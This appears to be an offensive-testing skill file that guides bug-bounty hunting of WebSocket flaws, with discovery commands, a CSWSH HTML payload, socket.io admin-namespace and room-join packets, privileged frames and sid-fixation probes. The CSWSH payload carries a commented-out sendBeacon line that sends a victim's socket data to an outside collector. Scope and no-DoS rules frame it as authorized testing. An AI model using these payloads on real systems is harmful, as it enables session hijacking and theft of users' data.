---
name: hunt-websocket
description: "Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, real-time features, chat, live dashboards, notifications, or trading platforms."
sources: hackerone_public, portswigger_research, cve
report_count: 11
---

# HUNT-WEBSOCKET — WebSocket Security

## Rails
- In-scope only. Two browsers: attacker origin + **your** victim test login.
- Read-only subscribe first. Privileged emits (`deleteUser`, trades) only against **your** objects, once.
- No DoS (CVE-class header bombs, ReDoS on `Sec-WebSocket-Extensions`) — fingerprint, do not weaponize.
- STOP at draft. A `101` from a foreign Origin is **not** a finding.

## Decision tree
1. Find sockets: JS `new WebSocket`, `socket.io`, SignalR, Phoenix, GraphQL `graphql-ws`/`subscriptions-transport-ws`, SockJS, `/cable`, `/ws`.
2. Auth model: ambient **cookie** vs `?token=` / `Sec-WebSocket-Protocol` / first-frame JWT. Cookie + no CSRF token → CSWSH **candidate** (Phase 2). Token in URL → Referer/log leak (`hunt-ato`).
3. **SameSite:** Chrome Lax **does not** send cookies on cross-site `WebSocket()` (subresource). CSWSH needs `SameSite=None` / missing SameSite / **sibling same-site** origin / app-set `None`. Check the cookie; do not skip CSWSH because “Lax exists” if a sibling or `None` is in play.
4. Then: per-message authz → tamper → namespace/room → GraphQL subscription IDOR → handshake smuggling.

## Surface
```
wss://host/ws  /socket.io/  /signalr  /cable  /graphql  /subscriptions
new WebSocket(  io(  Phoenix.Socket  @microsoft/signalr
```

Grounding: PortSwigger CSWSH labs; Schneider 2013; handshake DoS CVE-2020-7662 / CVE-2024-37890 exist — **do not** exploit DoS. Socket.io version fingerprint → advisory check, still prove live.

## Phase 1 — Discover
```bash
grep -rEo 'wss?://[^"'\'' ]+|new WebSocket|socket\.io|/signalr|/cable' --include='*.js' .
curl -sI -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300
```

## Phase 2 — CSWSH
Need **all three:** (a) ambient cookie auth, (b) no unguessable per-connection token, (c) Origin not enforced **at handshake *and* data**.

```html
<script>
const m = "CSWSH-"+Math.random().toString(36).slice(2);
const ws = new WebSocket("wss://TARGET/ws");
ws.onopen = () => ws.send(JSON.stringify({type:"subscribe", channel:"me", _m:m}));
ws.onmessage = e => {
  document.body.textContent += e.data;
  // navigator.sendBeacon("https://UNIQUE.oastify.com/cswsh", e.data);
};
</script>
```
Victim B logged into TARGET; page hosted on attacker origin (or sibling if Lax). **Confirm:** frames contain **B’s unique marker** (not A’s, not empty ping). OOB the payload.

**FP:** 101 then silence/close; token in query; data is public broadcast; SameSite=Lax blocking cookies from `evil.com` (try sibling / check flags).

## Phase 3 — Per-message authz
Handshake authed ≠ every frame authed. As B (low priv) and as unauth:
```
{"type":"getUserData","userId":A_ID}
{"action":"deleteUser","userId":A_ID}   # only a disposable test user
```
**Hit:** effect on a **second channel** (REST GET, other socket). Accepted-and-ignored is not a finding.

## Phase 4 — Tamper (finance/game)
Change `price`/`qty`/`userId` in Repeater. **Hit:** order/balance API persists the value — not UI echo. One test order.

## Phase 5 — socket.io / SignalR / Phoenix
Namespace is a **protocol packet**, not `?nsp=`:
```
# connect /admin as low-priv:  40/admin,
# join room:                  42/admin,["join",{"room":"user_A"}]
```
`40` ack empty ≠ finding. Need `42` events with **another user’s** data or a privileged side effect.

SignalR: `/hub/negotiate` then `Invoke` admin methods. Phoenix: `phx_join` `topic:user:A`.

## Phase 6 — GraphQL subscriptions
`connection_init` with stolen/omitted auth; `subscribe` `{ user(id:A){ email } }` or `node(id:)`. Same IDOR rules (`hunt-idor`, `hunt-graphql`). Unique marker in next payload.

## Phase 7 — Handshake Upgrade smuggling (not frames)
Once upgraded, bytes are WS frames — typing `GET /admin` into wscat does **nothing**. Probe **handshake** desync (bad `Sec-WebSocket-Version`, `Connection` mismatch) with HTTP Request Smuggler. Prove desync + impact (OAST / forbidden path) like classic smuggling (`hunt-http-smuggling`). One proof.

## Phase 8 — sid fixation (Engine.IO)
```bash
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=VICTIM_OR_FAKE"
```
200 resuming **another** sid’s stream = bug. `400 Session ID unknown` = OK.

## Validation
| Class | Proof |
|---|---|
| CSWSH | Attacker-origin page + B logged in → **B’s data** + OOB |
| No message auth | Privileged **effect** on second channel |
| Tamper | Server-side persist |
| Room/ns | Other-user `42` / events |
| Smuggle | Desync + OAST/impact |
| Reject | Bare 101, echo, empty namespace |

**Severity:** CSWSH + session token = **Critical**. CSWSH PII stream = **High**. Admin frames unauth = **Critical**. Financial tamper = **Critical**. Cross-tenant room = **High**.

## Chains
| WS | Compose | Impact |
|---|---|---|
| CSWSH | Token in stream | ATO (`hunt-ato`) |
| Cookie Lax + sibling | XSS/takeover on sibling | CSWSH despite Lax |
| No origin check | `hunt-csrf` CSWSH | State change |
| GraphQL sub IDOR | `hunt-idor` | Live PII |
| Upgrade smuggle | Cache/SSRF | High |

Cross-refs: `hunt-csrf`, `hunt-idor`, `hunt-session`, `hunt-graphql`, `hunt-http-smuggling`, `triage-validation`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
